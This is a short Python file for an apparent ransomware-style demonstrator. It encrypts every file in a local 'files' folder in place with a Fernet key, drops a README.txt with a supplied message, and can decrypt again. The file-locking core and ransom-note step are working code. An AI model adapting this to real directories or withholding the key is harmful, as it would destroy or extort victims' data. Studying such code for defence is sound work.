from cryptography.fernet import Fernet
import platform as pl
import os

class scryptor:

    def __init__(self):
        self.path = os.path.join(os.getcwd(), 'files')
        self.filenames = os.listdir(self.path)
        self.fullpath = [os.path.join(self.path, file) for file in self.filenames]
        self.key = os.path.join(os.getcwd(), 'key', 'file.key')

    def encryptFiles(self):
        try:
            open(self.key, 'wb').write(Fernet.generate_key())

            key = Fernet(key=open(self.key, 'rb').read())

            for file in self.fullpath:
                data = open(file, 'rb').read()

                encrypt_data = key.encrypt(data)

                open(file, 'wb').write(encrypt_data)

            return True
        except Exception as e:
            return e

    def decryptFiles(self):
        try:
            key = Fernet(key=open(self.key, 'rb').read())

            for file in self.fullpath:
                encrypted_data = open(file, 'rb').read()

                decrypt_data = key.decrypt(encrypted_data)

                open(file, 'wb').write(decrypt_data)

            return True
        except Exception as e:
            return e

    def existPath(self):
        if os.path.exists(self.path):
            return True

        else:
            return False

    def addReadme(self, message):
        open(os.path.join(self.path, 'README.txt'), 'w').write(message)

    def removeReadme(self):
        if os.path.exists(self.path):
            os.remove(os.path.join(self.path, 'README.txt'))

    def getOS(self):
        system = ['system']

        for so in system:
            if hasattr(pl, so):
                return getattr(pl, so)()

    def cleanTerm(self):
        so = self.getOS()

        if so == 'Windows':
            os.system('cls')

        else:
            os.system('clear')
